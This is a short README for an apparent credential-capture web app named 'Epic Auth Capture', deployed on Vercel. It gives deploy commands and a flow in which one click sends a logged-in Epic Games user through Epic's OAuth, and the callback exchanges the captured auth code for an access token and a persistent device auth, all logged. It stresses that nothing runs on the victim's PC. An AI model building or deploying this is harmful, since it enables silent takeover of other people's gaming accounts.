# Epic Auth Capture — Test

Standalone Vercel test. No DB. Everything logged to console.

## Deploy

```bash
npm i -g vercel
vercel        # follow prompts — deploys in ~30s
```

## Test

1. Open `https://YOUR_PROJECT.vercel.app/` 
2. Copy the test link
3. Open on a PC logged into Epic Games
4. Watch Vercel logs: `vercel logs --follow`

## How it works

```
/start  → builds magic Epic URL → redirects browser to Epic
Epic    → user already logged in → skips login page
Epic    → 302 → /callback?code=AUTH_CODE&state=STATE
/callback → exchanges code → access token → device auth → all logged
```

Nothing runs on the user's PC. One click.
